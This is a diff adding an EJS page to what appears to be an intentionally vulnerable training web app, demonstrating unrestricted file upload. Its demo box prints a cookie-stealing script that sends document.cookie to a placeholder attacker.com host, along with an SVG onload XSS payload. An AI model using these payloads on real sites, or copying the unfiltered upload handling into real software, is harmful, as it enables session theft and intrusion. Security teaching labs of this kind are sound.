@@ -1,0 +1,66 @@
+<%- include('partials/header') %>
+
+<div class="section">
+  <div class="page-header">
+    <h2>File Upload</h2>
+    <div class="vuln-badge upload">Unrestricted File Upload</div>
+  </div>
+
+  <div class="card">
+    <h3>Upload Avatar</h3>
+
+    <% if (success) { %>
+      <div class="alert success">
+        <%= success %><br>
+        <a href="<%= success.split(': ')[1] %>" target="_blank">→ Click to access uploaded file</a>
+      </div>
+    <% } %>
+    <% if (error) { %>
+      <div class="alert error"> <%= error %></div>
+    <% } %>
+
+    <form method="POST" action="/upload" enctype="multipart/form-data">
+      <div class="form-group">
+        <label>Select File (any type accepted )</label>
+        <input type="file" name="avatar">
+      </div>
+      <button type="submit" class="btn btn-primary">Upload</button>
+    </form>
+
+    <div class="exploit-box">
+      <h4>File Upload Attack Demo</h4>
+      <p>Create a file called <code>shell.html</code> with this content and upload it:</p>
+      <pre class="code-block">&lt;!-- shell.html --&gt;
+&lt;script&gt;
+  // Cookie stealer
+  new Image().src = 'http://attacker.com/steal?cookie=' + document.cookie;
+  alert('XSS via uploaded file! Cookie: ' + document.cookie);
+&lt;/script&gt;</pre>
+      <p>Or create <code>payload.svg</code>:</p>
+      <pre class="code-block">&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG XSS')"&gt;&lt;/svg&gt;</pre>
+      <p class="vuln-explain">
+        <strong>Why it works:</strong> No <code>fileFilter</code> in Multer config. Original filename preserved.
+        Files served statically → browser executes HTML/JS/SVG.
+        In a PHP server this would allow <code>.php</code> webshell execution.
+      </p>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Uploaded Files</h3>
+    <% if (files.length === 0) { %>
+      <p class="empty">No files uploaded yet.</p>
+    <% } else { %>
+      <ul class="file-list">
+        <% files.forEach(f => { %>
+          <li>
+            <a href="/uploads/<%= f %>" target="_blank"><%= f %></a>
+            <span class="file-ext"><%= f.split('.').pop().toUpperCase() %></span>
+          </li>
+        <% }) %>
+      </ul>
+    <% } %>
+  </div>
+</div>
+
+<%- include('partials/footer') %>
